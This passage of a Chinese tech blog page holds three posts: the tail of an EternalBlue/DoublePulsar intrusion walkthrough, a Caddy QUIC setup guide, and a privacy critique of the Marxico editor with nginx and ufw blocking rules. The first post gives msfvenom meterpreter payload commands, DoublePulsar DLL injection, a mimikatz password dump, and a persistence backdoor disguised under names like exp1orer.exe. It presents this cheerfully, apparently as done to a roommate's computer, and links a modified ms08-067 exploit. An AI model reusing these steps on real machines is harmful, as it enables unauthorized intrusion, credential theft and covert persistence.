<p>#32位<br>msfvenom -p windows&#x2F;meterpreter&#x2F;bind_tcp RHOST&#x3D;10.1.1.71 LPORT&#x3D;8089 -f dll &gt;x86bind.dll<br>#64位<br>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp RHOST&#x3D;10.1.1.71 LPORT&#x3D;8089 -f dll &gt;x64bind.dll</p>
<p>RHOST为目标机的IP、LPORT为目标机开的端口号</p>
<h2 id="使用Doublepulsar注入我们的恶意dll"><a href="#使用Doublepulsar注入我们的恶意dll" class="headerlink" title="使用Doublepulsar注入我们的恶意dll"></a>使用Doublepulsar注入我们的恶意dll</h2><p>use DoublePulsa</p>
<p>老样子，一路回车，除了Architecture选择x64，Function选RunDLL，然后输入DLL路径。</p>
<p><img src="/images/042217_1027_ShadowBroke11.png"></p>
<p>如果运气好的话，嘿嘿嘿……</p>
<p><img src="/images/042217_1027_ShadowBroke12.png"></p>
<h2 id="之后该做什么呢"><a href="#之后该做什么呢" class="headerlink" title="之后该做什么呢"></a>之后该做什么呢</h2><h3 id="获取管理员密码"><a href="#获取管理员密码" class="headerlink" title="获取管理员密码"></a>获取管理员密码</h3><p>当然第一步是吧管理员密码搞出来了，怎么办呢？很简单啦其实</p>
<p>load mimikatz<br>wdigest</p>
<p><img src="/images/042217_1027_ShadowBroke13.png"></p>
<p>哎这兄弟有我这样的室友真是悲剧啊……</p>
<h3 id="植入持久后门"><a href="#植入持久后门" class="headerlink" title="植入持久后门"></a>植入持久后门</h3><p>万一目标重启了，咱就要重新exploit、植入dll（因为这玩意是跑在内存里的），多不方便，所以不如咱植入个持久后门嘛，当然，咱要先交叉编译一个后门……</p>
<p>嗯其实就是，自己看着来，大概就是：</p>
<p>msfpc windows 172.26.99.211 443 bind verbose</p>
<p><img src="/images/042217_1027_ShadowBroke14.png"></p>
<p>之后meterpreter里来这么一句</p>
<p>run post&#x2F;windows&#x2F;manage&#x2F;persistence_exe REXENAME&#x3D;cmd.exe REXEPATH&#x3D;&#x2F;root&#x2F;backdoor&#x2F;miao.exe STARTUP&#x3D;USER</p>
<p>其中REXENAME是拷贝到目标系统中的名字，咱取个比较有迷惑性的，比如说exp1orer.exe啦（注意是1不是l），cmd.exe啦，httpd.exe啦等等吧；REXEPATH是后门在本地的位置，STARTUP有USER、SYSTEM、SERVICE这三种取值。看参数就知道是啥意思了。</p>
<h2 id="最后的话"><a href="#最后的话" class="headerlink" title="最后的话"></a>最后的话</h2><p>反正我们是啥都没要，一个IP就成功的黑了进去。颇有当年ms08-067的风范。</p>
<p>可怕的地方就是，看文件的时间戳，NSA在2011年就有了EternalBlue……你再看这文件名Eternal永远的永恒的……</p>
<p>等等……标题里还说了要黑Windows Server 2003不是？可是metasploit里的那个不支持中文版的Windows Server 2003啊……所以，要么咱用修改版的ms08-067，要么用NSA的那个。</p>
<p>修改版的ms-08-067戳我，<a target="_blank" rel="noopener" href="http://bbs.pediy.com/thread-186737.htm">来源戳我</a>，地址与使用方法戳章鱼猫 [gt href&#x3D;’<a target="_blank" rel="noopener" href="https://github.com/BennyThink/ms08-067/_Server/_2003/_Chinese/_Version'/]%E5%BC%80%E6%BA%90%E8%90%8C%E8%90%8C%E5%93%92%E7%AB%A0%E9%B1%BC%E7%8C%AB/[/gt/]">https://github.com/BennyThink/ms08-067\_Server\_2003\_Chinese\_Version&#39;\]开源萌萌哒章鱼猫\[/gt\]</a></p>
<h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p>exploit db论文： <a target="_blank" rel="noopener" href="https://www.exploit-db.com/docs/41896.pdf">How to Exploit ETERNALBLUE and DOUBLEPULSAR on Windows 7&#x2F;2008</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/04/22/shadowbroker/index/" data-id="clhp7rtjt008is2qr2l3ycqyu" data-title="[ShadowBroker]1：NSA工具集EternalBlue + Doublepulsar + meterpreter渗透Windows 7/2008，兼谈Windows Server 2003中文版渗透" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-quic/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/04/06/quic/index/" class="article-date">
  <time class="dt-published" datetime="2017-04-06T00:00:00.000Z" itemprop="datePublished">2017-04-06</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/linux/">linux</a>►<a class="article-category-link" href="/categories/linux/website/">website</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/04/06/quic/index/">前卫一下：给你的网站开启QUIC</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>今天在推上偶然发现Google在自己的服务器上启用了<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/QUIC">QUIC</a>，QUIC这东西嘛（发音同quick），就是Quick UDP Internet Connection，Google制定的一种基于UDP的低时延的互联网传输层协议。我觉得吧，Google率先在自家鼓捣部署的东西，那都是比较有前景的，比如说<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/SPDY">spdy</a>（基本上成了<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP/2">http&#x2F;2</a>的前身），比如说bbr，反正大概都是一些很牛的东西，我有信心般<strong>盲目的相信</strong>QUIC也是挺有前景的！</p>
<p>通常呐，咱们在访问一些HTTPS网站的时候，Chrome会告诉我们该连接使用<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%82%B3%E8%BC%B8%E5%B1%A4%E5%AE%89%E5%85%A8%E5%8D%94%E8%AD%B0">TLS</a>1.2（好像Google也在自家的一些服务部署了TLS1.3，<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%82%B3%E8%BC%B8%E5%B1%A4%E5%AE%89%E5%85%A8%E5%8D%94%E8%AD%B0#TLS_1.3.EF.BC.88.E8.8D.89.E6.A1.88.EF.BC.89">TLS1.3还是草案呢吧</a>），使用XXX加密和身份验证，使用XXX作为密钥交换机制。咱都知道HTTP是基于TCP的应用层协议，而TLS就好似套在了应用层和传输层之间的东西一样。盗用别人的话，以前的HTTP就是塑料管，一捅就漏（被篡改、劫持等），但是TLS就像是个金属外壳，这么一包上啊，就没那么容易漏水了。</p>
<p>而QUIC这玩意就更好玩了，它没管TCP的事，反而奇葩选择了UDP做为下一层协议，并且QUIC协议内置了TLS栈，实现了自己的传输加密层，等等等等我是说不明白了，反正我也不懂装懂呢嘛，盗用网上的图，QUIC的地位看起来是这样的：</p>
<p><img src="/images/040617_1241_QUI1.png"></p>
<p>反正嘛，这玩意就是看起来很厉害的样子，鉴于还没看到类似的中文教程，我就自己折腾下分享出来吧！请注意，这整篇文章都是<strong>实验性质</strong>的，想好了再折腾啊！出事了别怪我就好哦。</p>
<h2 id="对QUIC的支持"><a href="#对QUIC的支持" class="headerlink" title="对QUIC的支持"></a>对QUIC的支持</h2><h3 id="支持QUIC的Web服务器"><a href="#支持QUIC的Web服务器" class="headerlink" title="支持QUIC的Web服务器"></a>支持QUIC的Web服务器</h3><p>目前支持QUIC的服务器不是那么多，在Chromium的源码中有一个测试服务器，GitHub上有几个从Chromium抠下来的项目，还有go quic，大概都是属于<strong>pre-alpha</strong>阶段。但是几经搜寻，我找到了一个名为<a target="_blank" rel="noopener" href="https://caddyserver.com/">caddy</a>的、用go写的Web服务器，这家伙提供<strong>实验性质的quic支持</strong>。</p>
<p>话说这caddy有啥新特性呢？我去官网看了眼文档，给我的感觉是，caddy的目的是让网站变得<strong>更简单更易用</strong>，抢Nginx和Apache的饭碗并不是它的追求。而且这家伙配置文件很简洁，也没啥依赖，大概随用随走的意思！当然可能它也是为数不多的、开源的支持quic的Web服务器吧！</p>
<p>最令人眼睛一亮的是，这家伙自己就支持https，能签证书、续期咱就输个邮箱啥的，它就能帮咱去Let’s Encrypt搞个证书回来，而且去SSLLabs还会得A，简直是神奇啊！而且这家伙还能直接从git push写博客，具体没仔细看</p>
<p>[v_blue]有小伙伴可能会问了，那Nginx、Apache这俩是否支持QUIC呢？这个嘛……短时间之内应该还不会支持。毕竟这改动要好大的。GitHub上有个libquic，目前只有实验性质的<a target="_blank" rel="noopener" href="https://github.com/devsisters/goquic">goquic</a>能用这个库，别的还是等等吧。等到支持的时候，重新编译下就好啦。[&#x2F;v_blue]</p>
<h3 id="支持QUIC的浏览器"><a href="#支持QUIC的浏览器" class="headerlink" title="支持QUIC的浏览器"></a>支持QUIC的浏览器</h3><p>呐……Chrome、Chromium都没问题的！只要你的版本比较新，基本上就已经支持并默认开启QUIC啦。咱可以到<code>chrome://net-internals/#quic</code>里看下，开头就会告知我们是否启用了QUIC的支持。如果没开启的话，就到<code>chrome://flags</code>开启下</p>
<p>这么一看，那就是服务端的支持了，那咱咋开启啊……当然是去caddy官网下载，然后启动就好了。话说想要成功有挺多条件的，有一片不深不浅的水域，有一块不大不小的坑……啊不对，反正就是不是想象中的那么简单啦。</p>
<p>咱来谈谈准备条件吧。</p>
<p>首先，咱得有个域名，有个服务器，要是WordPress啥的还得准备好PHP、MySQL（MariaDB）啥的，对，最好再把证书也搞好（这一步不是必须的，因为Caddy可以为咱申请证书，但是我就当大家都搞好了）。我的运行环境是Ubuntu 16.04 64Bit，别的环境不敢保证。</p>
<p>好，今天有点废话，那咱正式开始踩坑吧……</p>
<p>咦？都有什么坑呀？我会告诉你，caddy官网下载的二进制如果开启quic会报错退出哟；我还会说，需要go1.8，包管理器的go1.6是不行滴！</p>
<p>如果你太懒，懒得自己弄，并且相信我的话，那就<a target="_blank" rel="noopener" href="http://oks2t4o68.bkt.clouddn.com/caddy20170417.tar.bz2">戳我</a>下载我编译好的吧！</p>
<h2 id="安装golang"><a href="#安装golang" class="headerlink" title="安装golang"></a>安装golang</h2><p>这golang啊，是C语言他爹、玩了<a target="_blank" rel="noopener" href="https://dmesg.app/reason-of-this-blog.html">Thompson Hack</a>的汤普森老爷子在Google搞的语言，据说很牛。怎奈Ubuntu 16.04的源里的go是1.6，然而caddy需要1.8，所以咱只能自己从官网搞个go回来了。为了偷懒，我们就不从源码编译了，直接下二进制就好了。想从源码编译golang的我不拦着哟！</p>
<p>wget <a target="_blank" rel="noopener" href="https://storage.googleapis.com/golang/go1.8.linux-amd64.tar.gz">https://storage.googleapis.com/golang/go1.8.linux-amd64.tar.gz</a><br>sudo tar -C &#x2F;usr&#x2F;local -xzf go1.8.linux-amd64.tar.gz<br>#编辑bashrc<br>vim ~&#x2F;.bashrc<br>#文件最后加入这么一行，保存退出<br>export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;go&#x2F;bin<br>#重新载入<br>source ~&#x2F;.bashrc<br>go version</p>
<p>显示为go version go1.8 linux&#x2F;amd64就可以了</p>
<p>注意：如果你安装了1.8以下的golang，需要卸载，包管理器的就用类似<code>apt remove golang-go</code>之类的命令卸载，编译的就直接<code>sudo rm –rf /usr/local/go</code>即可</p>
<h2 id="准备并编译caddy"><a href="#准备并编译caddy" class="headerlink" title="准备并编译caddy"></a>准备并编译caddy</h2><p>啥gcc啊，make啊，源码啊啥的都得准备好，gcc之类的就不说了，包管理器就够了。咱从源码开始，我们就假设工作目录为<code>/home/test</code>了、并且你已经切换到这个目录啦。</p>
<p>export GOPATH&#x3D;&#x2F;home&#x2F;test<br>go get github.com&#x2F;mholt&#x2F;caddy&#x2F;caddy<br>cd $GOPATH&#x2F;src&#x2F;github.com&#x2F;mholt&#x2F;caddy&#x2F;caddy<br>.&#x2F;build.bash</p>
<p>我估计大家会在第二步的时候失败或者是太慢（尤其是当你的服务器在境内的时候），那么请跟我一起艹GFW吧；</p>
<p>可以考虑使用下面这一堆命令</p>
<p>export GOPATH&#x3D;&#x2F;home&#x2F;test<br>wget <a target="_blank" rel="noopener" href="http://7xvwrt.com1.z0.glb.clouddn.com/caddy170406.tar.bz2">http://7xvwrt.com1.z0.glb.clouddn.com/caddy170406.tar.bz2</a><br>tar xf caddy170406.tar.bz2<br>cd $GOPATH&#x2F;src&#x2F;github.com&#x2F;mholt&#x2F;caddy&#x2F;caddy<br>.&#x2F;build.bash</p>
<p>在执行完最后一句的时候，咱应该会在当前目录下发现一个名为<code>caddy</code>的二进制程序。当然如果咱就想要个性，咱用<code>./build.bash fuckGFW</code>那生成的二进制就叫<code>fuckGFW</code>了。那些<code>./build.bash candy.exe</code>的人还是让我去撞墙吧\(^o^)&#x2F;~</p>
<h2 id="配置CaddyFile"><a href="#配置CaddyFile" class="headerlink" title="配置CaddyFile"></a>配置CaddyFile</h2><p>假设咱把caddy放在了<code>/home/caddy</code>，反正放哪都行，随便啦。</p>
<p>咱就大概编辑个这么模样的文件，名为Caddyfile</p>
<p>:443 <a target="_blank" rel="noopener" href="http://www.shemissed.me/">www.shemissed.me</a> {<br>root &#x2F;home&#x2F;wwwroot&#x2F;<a target="_blank" rel="noopener" href="http://www.shemissed.me/">www.shemissed.me</a><br>fastcgi &#x2F; &#x2F;tmp&#x2F;php-cgi.sock php<br>log &#x2F;home&#x2F;wwwlogs&#x2F;caddy.<a target="_blank" rel="noopener" href="http://www.shemissed.me.log/">www.shemissed.me.log</a><br>tls &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;<a target="_blank" rel="noopener" href="http://www.shemissed.me/fullchain.pem">www.shemissed.me/fullchain.pem</a> &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;<a target="_blank" rel="noopener" href="http://www.shemissed.me/privkey.pem">www.shemissed.me/privkey.pem</a><br>}</p>
<p>假如要是有多个虚拟主机（vhost），就接着写</p>
<p>memory.shemissed.me {<br>root &#x2F;home&#x2F;wwwroot&#x2F;memory.shemissed.me<br>fastcgi &#x2F; &#x2F;tmp&#x2F;php-cgi.sock php<br>log &#x2F;home&#x2F;wwwlogs&#x2F;caddy.memory.shemissed.me.log<br>tls &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;memory.shemissed.me&#x2F;fullchain.pem &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;memory.shemissed.me&#x2F;privkey.pem<br>}</p>
<p>类似这样的就行了。</p>
<p>大家伙看着改咯。其中：</p>
<p>如果你想开启HSTS，那就加个</p>
<p>Strict-Transport-Security “max-age&#x3D;63072000; includeSubDomains; preload;”</p>
<p>如果想自己设定cipher suite，那就看<a target="_blank" rel="noopener" href="https://caddyserver.com/docs">官网文档</a>去，剩下的更多的特性，什么rewrite就自己发挥吧。 [v_blue]注意： <code>/tmp/php-cgi.sock</code>是php-fpm的监听地址，去<code>php-fpm.conf</code>里看下listen写的是啥就行了，有的人可能会是<code>127.0.0.1:9000</code>。如果你后端使用的是jsp，也这样照猫画虎的改。[&#x2F;v_blue]</p>
<h2 id="运行caddy"><a href="#运行caddy" class="headerlink" title="运行caddy"></a>运行caddy</h2><p>咱把上上一部编译出来的二进制拷贝到<code>/home/caddy</code>下，然后把这个路径加入到Path之中（<code>export PATH=$PATH:/home/caddy</code>），之后咱<code>caddy -conf /home/caddy/Caddyfile -port 443 -http2 –quic</code>，再去浏览器刷新几下看F12，就应该能看到QUIC了吧？</p>
<p><img src="/images/040617_1241_QUI2.png"></p>
<p>有的时候死活不出来QUIC（尤其是PC版哦），俺也不知道是为啥……PS，此网站不适合访问……！</p>
<h2 id="等等，这就结束了吗？"><a href="#等等，这就结束了吗？" class="headerlink" title="等等，这就结束了吗？"></a>等等，这就结束了吗？</h2><p>当然不是，其实这坑还是非常多的，假如终端关掉了，那caddy不就被kill了嘛。咱可以加个&amp;给丢后台，再用pidof写个脚本加入crontab检查运行状态。尽管如此，这样用也不是最佳实践。</p>
<p>那正确的应该咋用呢？</p>
<p>把二进制放在<code>/usr/local/bin/caddy</code></p>
<p>把SysV风格的启动脚本放在<code>/etc/init.d/caddy</code>（这个脚本可以在官网的二进制包里找到）</p>
<p>配置文件目录放这<code>/etc/caddy</code>证书放在子目录ssl 并且属主是www啥的</p>
<p>创建配置文件<code>/etc/caddy/Caddyfile</code></p>
<p>用<code>service caddy start|stop|restart|reload|status</code> 管理服务（<code>/etc/init.d/candy restart</code>）</p>
<p>还有啥，比如说</p>
<p>别用root运行</p>
<p>用non-login shell运行</p>
<p>提高ulimit文件描述符限制（<code>ulimit -n 8192</code>，或者在<code>/etc/profile</code>中） 反正一堆咯，自己读readme咯</p>
<h2 id="最后的注意事项"><a href="#最后的注意事项" class="headerlink" title="最后的注意事项"></a>最后的注意事项</h2><p>我没把这玩意部署在本站上，因为我目前也暂时把它当做<strong>experimental features &amp; I’m just boring</strong>，所以就搞到了马甲站上，也没做什么更多的测试……等个几年，等到TLS1.3正式公布、QUIC被更多的Web服务器支持，我再开……当然了，现在TCP_BBR已经在4.9内核里，我还是没开 :arrow: </p>
<p>所以，那些想要折腾的、体验一下QUIC快感的人，不妨试试吧！走在世界的最前端~</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/04/06/quic/index/" data-id="clhp7rtif0077s2qrcafz128y" data-title="前卫一下：给你的网站开启QUIC" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-no-more-maxiang/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/04/05/no-more-maxiang/index/" class="article-date">
  <time class="dt-published" datetime="2017-04-05T00:00:00.000Z" itemprop="datePublished">2017-04-05</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/security/">security</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/04/05/no-more-maxiang/index/">为了你的隐私考虑，别用马克飞象了</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>评论中某读者和作者求证之后，马克飞象已经不存在这个隐私问题了。请注意。</p>
<p>是的，你没看错，我标题写的是”别用马克飞象”了。似乎我的博客里从来没有出现过说不要用某个产品的说辞，但是这一次，我觉得必须要说一下了。<strong>如果你在意你的隐私，那就别用马克飞象了</strong>。</p>
<p>那么为啥不要用呢？</p>
<h2 id="太长不看版"><a href="#太长不看版" class="headerlink" title="太长不看版"></a>太长不看版</h2><p>HTTP传输。<strong>全站HTTPS的行动刻不容缓</strong>，<a target="_blank" rel="noopener" href="https://fiveyellowmice.com/posts/2015/10/fight-a-peoples-war-for-https.html">为 HTTPS 打一场人民战争</a>！</p>
<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>今天白天勤快给<a target="_blank" rel="noopener" href="https://www.tougetu.com/">小蜗牛童鞋</a>的服务器部署了防盗链，用Nginx大概是下面这样的语法：</p>
<p>valid_referers none blocked <a target="_blank" rel="noopener" href="http://www.mingyueli.com/">www.mingyueli.com</a> *.google.com *.baidu.com *.so.com;<br>if ($invalid_referer) {<br>rewrite ^&#x2F; <a target="_blank" rel="noopener" href="https://okwbu9s8e.qnssl.com/moon-hotlink2.png">https://okwbu9s8e.qnssl.com/moon-hotlink2.png</a>;<br>}</p>
<p>大家可以看到，如果referer不是<code>www.mingyueli.com *.google.com *.baidu.com *.so.com</code>这几个，那么就会被302重定向到一个图片上，实际上这个图片也就是盗链提示的图。</p>
<p>晚上的时候，小蜗牛突然给我发图，问我这个防盗链的图是怎么回事。其实我是没想到这么快发现的好吧。想着新站大概也不会有多少流量、有多少盗链，深感此中必有蹊跷，我就分析了下Nginx的日志打算寻找下原因。</p>
<p>首先过滤下302，大概就是这样的命令吧</p>
<p>cat <a href="http://www.mingyueli.com.log|grep">www.mingyueli.com.log|grep</a> –a ‘302’</p>
<p>然后我就发现了这么奇怪的一行日志</p>
<p><img src="/images/040517_1357_1.png"></p>
<p>（出于隐私保护，我把小蜗牛童鞋的IP、UA给打上马赛克了）</p>
<p>果真是有个referer，被Nginx撵走了。但是这个referer这么奇葩，竟然是个IP，是哪的呢？</p>
<p>ip.cn查了下，青岛阿里云，本着好奇的想法就贴到了地址栏，我这么一回车啊……</p>
<p><img src="/images/040517_1357_2.png"></p>
<p>哎我去？我就想，难道这是小蜗牛童鞋自己搭建了一个markdown服务器？不可能啊超级麻烦的，而且闲的没事干啊？</p>
<p>于是我就<code>nslookup</code>一下马克飞象的官网</p>
<p>当当当！</p>
<p><img src="/images/040517_1357_3.png"></p>
<p>然而这丫的官网却是带https的，敢情这IP是<code>default_server</code>啊……</p>
<h2 id="进一步调查"><a href="#进一步调查" class="headerlink" title="进一步调查"></a>进一步调查</h2><p>我开始觉得马克飞象这玩意不太靠谱，于是果断去官网，下个客户端，安装-wireshark抓包。当然啦，俺平时是开着VPN的，如果这个时候抓包，直接被路由表搞走了，肯定是没啥效果的，所以我暂时关了VPN</p>
<p>反正抓包的过程也简单的，既然咱都知道要过滤的目标IP是115.29.201.173，所以咱就选择网卡，抓，打开马克飞象，随意做点操作，上传个图啊什么的。</p>
<p>之后停止抓包，过滤条件里输入这么个条件一回车：</p>
<p>ip.dst&#x3D;&#x3D;115.29.201.173</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/04/2017040514004141.jpg"><img src="/images/2017040514004141.jpg"></a></p>
<p>好多TCP，有点干扰，为了过滤掉多余的TCP，再这么一弄过滤条件</p>
<p>ip.dst&#x3D;&#x3D;115.29.201.173 and http</p>
<p><img src="/images/2017040514011622.jpg"></p>
<p>我擦别逗我，全都是HTTP的，擦，那我写的东西传输过程中指不定变成啥样、指不定被谁看个遍啊……</p>
<p>太没良心了吧我说！<code>default server</code>（也就是<a target="_blank" rel="noopener" href="http://115.29.201.173/client/_zh.html%EF%BC%89%E5%AD%98%E5%9C%A8%E7%9A%84cookies%E6%B3%84%E9%9C%B2%E3%80%81%E4%B8%AD%E9%97%B4%E4%BA%BA%E5%95%A5%E7%9A%84%E6%88%91%E5%B0%B1%E4%B8%8D%E8%AF%B4%E4%BA%86%EF%BC%8C%E8%BF%99%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9B%B4%E6%8E%A5%E6%98%8E%E6%96%87%E4%BC%A0%EF%BC%8C%E6%98%AF%E5%87%A0%E4%B8%AA%E6%84%8F%E6%80%9D%E5%95%8A%EF%BC%9F%E6%98%8E%E6%96%87%E4%BC%A0%E4%B9%9F%E5%B0%B1%E7%BD%A2%E4%BA%86%EF%BC%8Chost%E8%BF%98%E6%98%AF%60default">http://115.29.201.173/client\_zh.html）存在的cookies泄露、中间人啥的我就不说了，这客户端直接明文传，是几个意思啊？明文传也就罢了，host还是`default</a> server&#96;</p>
<h2 id="HTTPS的通信抓包之后应该是咋样的"><a href="#HTTPS的通信抓包之后应该是咋样的" class="headerlink" title="HTTPS的通信抓包之后应该是咋样的"></a>HTTPS的通信抓包之后应该是咋样的</h2><p>拿本博做例子，是酱紫的：</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/04/2017040514021066.jpg"><img src="/images/2017040514021066.jpg"></a></p>
<p>咱能明显的看到有Client Hello、密钥交换过程，在这个交换过程中、交换之后，到底做了啥、主机名是啥，咱是真不知道。只有DNS查询过程中能看见我请求了一个解析。这第三者（包括抓包，本质上也算是”窃听者”）想要解密，就没那么容易了。</p>
<p>[v_blue]隐隐约约想起了avast以前会装个自己的根证书，声称是用来解密HTTPS通信、防止一些网页挂马什么的。至于安全性，我是不咋看好。[&#x2F;v_blue]</p>
<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>后来手欠看了下马克飞象的安装包，图标大概是这样的</p>
<p><img src="/images/040517_1357_4.png"></p>
<p>哎我这不是WinRAR的自解压文件吗？那你要个毛管理员权限啊！在一个<code>test.bat</code>中我发现了这么一句话</p>
<p>为了关联Evernote中的笔记，马克飞象需要向注册表写入配置……</p>
<p>莫非是临时工做的？</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>所以啊，这玩意快扔垃圾桶吧，http是最不能忍的，一丝一毫都不能忍……<a target="_blank" rel="noopener" href="https://fiveyellowmice.com/posts/2015/10/fight-a-peoples-war-for-https.html">全站HTTPS是必须的</a>！全世界最大的黄网<a target="_blank" rel="noopener" href="https://thenextweb.com/insider/2017/03/31/pornhub-youporn-https-isp/">pornhub都上https了</a>，咱还有啥理由不拥抱全站https啊？</p>
<p>当然了，有些人大可以说，我不在乎我的隐私，嗯这就好似有些人说”政治与我无关”一样。</p>
<p>然而我个人是非常在乎我的、以及我的访客的隐私，这也是我没有开启评论UA、更别提把地理位置信息啥的暴露给大众的原因。</p>
<p>所以在我<a target="_blank" rel="noopener" href="https://dmesg.app/greengrapes2.html">为小蜗牛童鞋二次开发的主题</a>中，UA选项选项默认是关闭的（那俺为啥要开发这个功能呢？没事闲的、写点程序练练手、满足一下内心那可怕的心理需求、刷刷存在感呗）的确，我可以通过日志、通过访问统计工具来获得访客的UA等信息，如果我想，我可以分析出来一个人都看了什么（很显然我啥时候闲的有这个功夫了）。但是这只有我才能做到，这也就意味着我需要对访客的隐私负责—— 我需要做好服务器的安全工作，保护日志不外泄，尽管访客可能毫不在意这点。</p>
<p>好吧，说实话，其实我是装有Random User-Agent的……</p>
<h2 id="其他markdown替代品"><a href="#其他markdown替代品" class="headerlink" title="其他markdown替代品"></a>其他markdown替代品</h2><p>有人可能会问了，有没有啥markdown替代品啊？嗯，在Windows下我使用markdown pad2，在Linux下我使用Remarkable（这家伙也要出Windows版本的，只是一直是Under development）。</p>
<p>[v_blue]The view has crashed? 如果你使用的是Windows 8及更新版本，markdown pad2可能会有这么一条警告导致无法预览。解决方案很简单，<a target="_blank" rel="noopener" href="http://markdownpad.com/download/awesomium_v1.6.6_sdk_win.exe">下载awesomium</a>并安装就好啦[&#x2F;v_blue]</p>
<h2 id="更狠一步的解决方案"><a href="#更狠一步的解决方案" class="headerlink" title="更狠一步的解决方案"></a>更狠一步的解决方案</h2><p>对于这么嚣张的玩意，我一直是深恶痛绝的，那怎么再以身作则玩一玩呢？</p>
<h3 id="屏蔽马克飞象UA"><a href="#屏蔽马克飞象UA" class="headerlink" title="屏蔽马克飞象UA"></a>屏蔽马克飞象UA</h3><p>咦，是不是日志中记录了这么一串UA</p>
<p>Mozilla&#x2F;5.0 (Windows NT 6.2; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Marxico&#x2F;1.0.0 Chrome&#x2F;47.0.2526.110 Electron&#x2F;0.36.10 Safari&#x2F;537.36</p>
<p>那好办了，找到自己的nginx配置文件，server段里加这么一句</p>
<p>if ($http_user_agent ~* (Marxico)) {<br>return 403;<br>}</p>
<p>然后重启Nginx</p>
<p>&#x2F;etc&#x2F;init.d&#x2F;nginx reload</p>
<p>就好了，假如要禁止掉多个UA，那就用管道隔开，形如<code>python-requests|Python-urllib|Marxico</code>就可以了。</p>
<h3 id="Nginx屏蔽马克飞象IP"><a href="#Nginx屏蔽马克飞象IP" class="headerlink" title="Nginx屏蔽马克飞象IP"></a>Nginx屏蔽马克飞象IP</h3><p>呐，这个很简单，直接来一句<code>deny 115.29.201.173;</code>然后重启Nginx即可。 当然了我这人超级爱黑名单，所以都是新建一个名为<code>blackip.conf</code>，里面写满了那些我讨厌的IP，然后<code>nginx.conf</code>里直接<code>include blackip.conf</code></p>
<h3 id="UFW-x2F-iptables屏蔽马克飞象IP"><a href="#UFW-x2F-iptables屏蔽马克飞象IP" class="headerlink" title="UFW&#x2F;iptables屏蔽马克飞象IP"></a>UFW&#x2F;iptables屏蔽马克飞象IP</h3><p>这个就更暴力了，直接来一句</p>
<p>ufw insert 1 deny from 115.29.201.173 to any</p>
<p>世界清净了</p>
<h2 id="最后的致歉"><a href="#最后的致歉" class="headerlink" title="最后的致歉"></a>最后的致歉</h2><p>如果原先的防盗链的图给小蜗牛童鞋造成了困扰，那么深表歉意……我是故意的，有一些事情，大概就是它原本的样子，也许只是内心深处最后的挣扎与冲突吧——如果，没有如果。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/04/05/no-more-maxiang/index/" data-id="clhp7rthu0061s2qraiwl0xtj" data-title="为了你的隐私考虑，别用马克飞象了" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/12/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="page-number" href="/page/12/">12</a><span class="page-number current">13</span><a class="page-number" href="/page/14/">14</a><a class="page-number" href="/page/15/">15</a><span class="space">&hellip;</span><a class="page-number" href="/page/21/">21</a><a class="extend next" rel="next" href="/page/14/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/china/">china</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/china/justsay/">justsay</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/cloudflare/">cloudflare</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/gfw/">gfw</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/">it</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/it/justsay/">justsay</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/security/">security</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/it/share/">share</a></li></ul></li><li class="category-list-item"><a 